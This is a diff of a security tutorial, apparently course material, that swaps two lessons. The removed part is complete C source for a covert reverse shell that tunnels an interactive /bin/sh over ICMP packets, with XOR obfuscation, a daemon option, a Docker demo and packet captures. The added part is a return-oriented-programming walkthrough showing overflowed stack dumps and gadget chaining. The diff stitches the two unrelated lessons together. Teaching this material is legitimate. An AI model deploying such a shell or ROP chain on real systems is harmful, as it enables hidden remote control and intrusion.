-// in a heavily loaded network), and then we just check the
-// ICMP message type and id. This is the way we mark our packets
-// to know they are ours and not a regular ICMP message.
-//
-// An alternative is to add a magic word just before the len in
-// the data part of the packet and check that value to identify
-// the packet.
-//
-// If the packet is ours (and not a normal ICMP packet), the
-// data is copied in the provided buffer and its length is
-// returned. The async_read function takes care of the rest from
-// this point on.
-//
-// Returns the length of the packet received or 0
-int
-net_read_icmp (int s, void *buf, size_t count)
-{
-        PKT pkt;
-        int len, l;
-
-        l = read (s, &pkt, sizeof (PKT)); // Read IP + ICMP header
-        if ((pkt.icmp.type == icmp_type) &&
-            (ntohs(pkt.icmp.un.echo.id) == id))
-        {
-                len = ntohs (pkt.len);
-                memcpy (buf, (char*)pkt.data, len);
-                return len;
-        }
-
-        return 0;
-}
-
-// packet injector,
-//
-// For RAW sockets, were we are not binding the socket
-// to any address and there is no accept or connect involved,
-// we have to use the datagram primitives. The sendto system
-// call allows us to send data to a specific address, in this
-// case to the IP address we passed to the program as parameter.
-//
-// Note: we are not setting the IP header so this is the way we
-// provide the destination IP address to the TCP/IP stack.
-int
-net_write_icmp (int s, void *buf, size_t count)
-{
-        PKT_TX          *pkt;
-        struct icmphdr *icmp = (struct icmphdr*) &pkt;
-        int len;
-
-        // dynamically allocate the packet including the
-        // size of the buffer we want to transmit
-        pkt = malloc (sizeof (PKT_TX) + count);
-        icmp = (struct icmphdr*) pkt;
-        pkt->len = htons(count);
-        // fill in the content
-        memcpy ((unsigned char*)pkt + sizeof(PKT_TX), buf, count);
-
-        len = count + sizeof(int);
-        len += sizeof (struct icmphdr);
-
-        /* Build an ICMP Packet */
-        // icmp_type and the id parameters are relevant since
-        // are used by our sniffer to identify our own packets.
-        icmp->type = icmp_type;
-        icmp->code = 0;
-        icmp->un.echo.id = htons(id);
-        icmp->un.echo.sequence = htons(5);
-        // set the checksum field to zero and calculate the checksum
-        // for the packet
-        icmp->checksum = 0;
-        icmp->checksum = icmp_cksum ((char*)icmp, len);
-
-        sendto (s, pkt, len, 0,
-                (struct sockaddr*) &dest,
-                sizeof (struct sockaddr_in));
-        free (pkt);
-        return len;
-}
-
-// Function that allow us to implement a reverse remote shell.
-//
-// It makes use of two system calls dup2 and execv. The first one
-// duplicates a given file descriptor. In this case, the three
-// calls at the beginning of the function, assigns the file
-// descriptor received as parameter to the Standard Input (file
-//  descriptor 0), Standard Output (file descriptor 1) and
-// Standard Error (file descriptor 3).
-//
-// If the file descriptor we pass as a parameter is one of the
-// sockets created with our previous client and server functions,
-// we are effectively sending and receiving data through the
-// network every time we write data to the console and we read data
-// from stdin.
-//
-// Ported to ANDROID
-int
-start_shell (int s)
-{
-        char *name[3];
-
-#ifdef VERBOSE
-        printf ("+ Starting shell\n");
-#endif
-        dup2 (s, 0);
-        dup2 (s, 1);
-        dup2 (s, 2);
-
-#ifdef _ANDROID
-        name[0] = "/system/bin/sh";
-#else
-        name[0] = "/bin/sh";
-#endif
-        name[1] = "-i";
-        name[2] = NULL;
-        execv (name[0], name );
-        exit (EXIT_FAILURE);
-
-        return 0;
-}
-
-// This function decode the information received from the network sends
-// it to the shell using the counterpart socket (from the socketpair)
-// system call.
-//
-// At the same time, whenever the shell produces some output, this function
-// will read that data, crypt it and send it over the network.
-//
-// Receives as parameters two file descriptors, one representing the
-// socketpair end for communications with the shell (s1) and the
-// other for networking (s).
-void
-async_read (int s, int s1)
-{
-        fd_set rfds;
-        struct timeval tv;
-        int max = s > s1 ? s : s1;
-        int len, r;
-        char buffer[BUF_SIZE];  /* 1024 chars */
-        max++;
-
-        while (1)
-        {
-                // macros to initialize the file descriptor set
-                FD_ZERO(&rfds);
-                FD_SET(s,&rfds);
-                FD_SET(s1,&rfds);
-
-                /* Time out. */
-                // set to 1 second
-                // microseconds resolution
-                tv.tv_sec = 1;
-                tv.tv_usec = 0;
-
-                // standard select loop for a network application.
-                if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
-                {
-                        perror ("select:");
-                        exit (EXIT_FAILURE);
-                }
-                else if (r > 0) /* If there is data to process */
-                {
-                // The memfrob function does a XOR crypting with
-                // key (42). The greatest thing about XOR crypting is that the
-                // same function can be used for crypt and decrypt. Other than
-                // that, with a 1 byte long key (42 in this case) it is pretty
-                // useless.
-                        if (FD_ISSET(s, &rfds))
-                        {
-                                // get data from network using function pointer,
-                                // and resend it to our shell.
-                                memset (buffer, 0, BUF_SIZE);
-                                if ((len = net_read (s, buffer, BUF_SIZE)) == 0) continue;
-                                write (s1, buffer, len);
-                        }
-                        if (FD_ISSET(s1, &rfds))
-                        {
-                                // get data from our shell, then
-                                // we send it back through the network using the
-                                // function pointer.
-                                memset (buffer, 0, BUF_SIZE);
-                                if ((len = read (s1, buffer, BUF_SIZE)) <= 0) exit (EXIT_FAILURE);
-                                net_write (s, buffer, len);
-                        }
-                }
-        }
-}
-
-// Set up the socket pair and create a new process (using fork)
-//
-// Function creates a socket pair using the syscall socketpair).
-// The fork system call creates a new process as an identical image
-// that make use of the sp socketpair to communicate both processes.
-//
-// Instead of feeding data into our shell directly from the network,
-// function is used to send/receive data using the counterpart socket
-// provided by socketpair.
-void
-secure_shell (int s)
-{
-        pid_t pid;
-        int sp[2];
-
-        /* Create a socketpair to talk to the child process */
-        if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
-        {
-                perror ("socketpair:");
-                exit (1);
-        }
-
-        /* Fork a shell */
-        if ((pid = fork ()) < 0)
-        {
-                perror ("fork:");
-                exit (1);
-        }
-        else
-        if (!pid) /* Child Process */
-        {
-                close (sp[1]);
-                close (s);
-
-                start_shell (sp[0]);
-                /* This function will never return */
-        }
-
-        /* At this point we are the father process */
-        close (sp[0]);
-#ifdef VERBOSE
-        printf ("+ Starting async read loop\n");
-#endif
-        net_write (s, "iRS v0.1\n", 9);
-        async_read (s, sp[1]);
-
-}
-
-int
-main (int argc, char *argv[])
-{
-        int i =1;
-        /* FIXME: Check command-line arguments */
-        /* Go daemon ()*/
-
-        // Assign function pointers
-        net_read = net_read_icmp;
-        net_write = net_write_icmp;
-
-        if (argv[i][0] == 'd')
-        {
-                i++;
-                daemon (0,0);
-        }
-
-        if (argv[i][0] == 's')
-                secure_shell (raw_init (argv[i+1], IPPROTO_ICMP));
-        else if (argv[i][0] == 'c')
-                async_read (raw_init (argv[i+1], IPPROTO_ICMP), 0);
-
-        return 0;
-}
+─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
+0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
+0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+                                    esp           ebp
+0xffffd750 41 41 41 41 41 41 41 41 [00 00 00 00] [42 42 42 42] AAAAAAAA....BBBB
+            ret              magic
+0xffffd760 [a6 85 04 08 ef] [be ad de 9c] 84 04 08 99 84 04 08 ................
+0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
+0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
+0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
+0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
+0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
+0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...
 ```
-
-Let's try it out:
-
-```bash
-# In the first terminal
-docker network create testnet
-docker run --privileged --net testnet -it basic_cybersecurity5:latest
-root@d1c09e1b8f84:~# ./icmp_shell c 172.18.0.3
-+ Raw to '172.18.0.3' (type : 0)
-
-# In the second terminal
-docker run --privileged --net testnet -it basic_cybersecurity5:latest
-root@c134e2dbde63:~# ./icmp_shell s 172.18.0.2
-+ Raw to '172.18.0.2' (type : 0)
-
-# In the third terminal
-docker exec -it d1c09e1b8f84 bash
-root@d1c09e1b8f84:~# tcpdump -nnXSs 0 -i eth0 icmp
-tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
-
-
-# In the first terminal
-# uname -a
-iRS v0.1
-# ls
-checksec.sh
-client
-client.c
-crypt_shell
-crypt_shell.c
-icmp_shell
-icmp_shell.c
-rp++
-server
-server.c
-#
-
-# which produces the following output in the third terminal
-08:49:28.471170 IP 172.18.0.2 > 172.18.0.3: ICMP echo reply, id 12345, seq 5, length 15
-	0x0000:  4500 0023 e750 4000 4001 fb5f ac12 0002  E..#.P@.@.._....
-	0x0010:  ac12 0003 0000 594b 3039 0005 0003 0000  ......YK09......
-	0x0020:  6c73 0a                                  ls.
-08:49:28.476440 IP 172.18.0.3 > 172.18.0.2: ICMP echo reply, id 12345, seq 5, length 111
-	0x0000:  4500 0083 5462 4000 4001 8dee ac12 0003  E...Tb@.@.......
-	0x0010:  ac12 0002 0000 1614 3039 0005 0063 0000  ........09...c..
-	0x0020:  6368 6563 6b73 6563 2e73 680a 636c 6965  checksec.sh.clie
-	0x0030:  6e74 0a63 6c69 656e 742e 630a 6372 7970  nt.client.c.cryp
-	0x0040:  745f 7368 656c 6c0a 6372 7970 745f 7368  t_shell.crypt_sh
-	0x0050:  656c 6c2e 630a 6963 6d70 5f73 6865 6c6c  ell.c.icmp_shell
-	0x0060:  0a69 636d 705f 7368 656c 6c2e 630a 7270  .icmp_shell.c.rp
-	0x0070:  2b2b 0a73 6572 7665 720a 7365 7276 6572  ++.server.server
-	0x0080:  2e63 0a                                  .c.
-08:49:28.477890 IP 172.18.0.3 > 172.18.0.2: ICMP echo reply, id 12345, seq 5, length 14
-	0x0000:  4500 0022 5463 4000 4001 8e4e ac12 0003  E.."Tc@.@..N....
-	0x0010:  ac12 0002 0000 ac9f 3039 0005 0002 0000  ........09......
-	0x0020:  2320                                     #.
-
+note that the registers `ebp` and `edi` have been pushed to the stack having the stack pointer `esp` at `0xffffd758`. Moreover, the return address of this function will be `0x080485a6` (ret) and `magic` is taken directly from the stack. After `add_bin` executes, the function returns to `0x080485a6` which we previously engineer to point to the following instructions:
 ```
+0x080485a6 _fini+18 pop    %ebx
+0x080485a7 _fini+19 ret    
+```
+with a stack that looks like what follows:
+```
+─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
+0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
+0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd750 41 41 41 41 41 41 41 41 00 00 00 00 42 42 42 42 AAAAAAAA....BBBB
+                        esp
+0xffffd760 a6 85 04 08 [ef be ad de] 9c 84 04 08 99 84 04 08 ................
+0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
+0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
+0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
+0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
+0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
+0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...
+```
+After executing the first instruction (`0x080485a6 _fini+18 pop    %ebx`), the stack looks like:
+```
+─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
+0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
+0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd750 41 41 41 41 41 41 41 41 00 00 00 00 42 42 42 42 AAAAAAAA....BBBB
+                                    esp
+0xffffd760 a6 85 04 08 ef be ad de [9c 84 04 08] 99 84 04 08 ................
+0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
+0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
+0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
+0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
+0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
+0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...
+```
+ The stack pointer `esp` now points to the address of `add_sh`. With this setup, the next instruction (`0x080485a7 _fini+19 ret`) will in fact make the instruction pointer `eip` point to the address of `add_sh`. The flow of the stack continues similarly, with return addresses pointing to sections in the code that "adjust the stack offset" so that the flow goes as desired.
 
-### Bibliography
-- [1] 0x00pf (2016), *Remote Shells. Part I*. Retrieved from https://0x00sec.org/t/remote-shells-part-i/269.
-- [2] picoFlamingo, *0x00sec_code*, Github. Retrieved from https://github.com/0x00pf/0x00sec_code/tree/master/remote_shell.
-- [3] 0x00pf (2016), *Remote Shells Part IV. The Invisible Remote Shell*. Retrieved from  https://0x00sec.org/t/remote-shells-part-iv-the-invisible-remote-shell/743
-- [4] 0x00pf (2016), *Remote Shells. Part II. Crypt your link*. Retrieved from https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.
+ ### Bibliography
+
+ - [1] M. Hicks (2014), *Software Security*, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <https://www.coursera.org/learn/software-security>.
+ - [2] Hovav Shacham (2007), *The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)*. In Proceedings of the 14th ACM conference on Computer and communications security (CCS '07). ACM, New York, NY, USA, 552-561. DOI: https://doi.org/10.1145/1315245.1315313
+ - [3] Alex Reece (2013). *Introduction to return oriented programming (ROP)*. Retrieved from http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html.
+ - [4] Georgia Tech (2016). *CS 6265: Information Security Lab. Schedule*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2016/cal.html
+ - [5] Georgia Tech (2017). *CS 6265: Information Security Lab. Schedule*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2017/cal.html
+ - [6] Georgia Tech (2017). *CS 6265: Information Security Lab. Lec07: Return-oriented Programming*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2016/l/lab07-rop/README-tut.txt
+ - [7] Standford. *64-bit Linux Return-Oriented Programming*. Retrieved from https://crypto.stanford.edu/~blynn/rop/
+ - [8] slimm609. *checksec.sh*. Retrieved from https://github.com/slimm609/checksec.sh
+ - [9] Ketan Singh (2017), *Introduction to Return Oriented Programming (ROP)*. Retreived from https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/.
+ - [10] Stack Overflow. *Managing inputs for payload injection?*. Retrieved from https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa.
+ - [11] Long Le. *Python Exploit Development Assistance for GDB (PEDA)*. Retreived from https://github.com/longld/peda.
+ - [12] Axel Souchet. *rp++*. Retrieved from https://github.com/0vercl0k/rp.
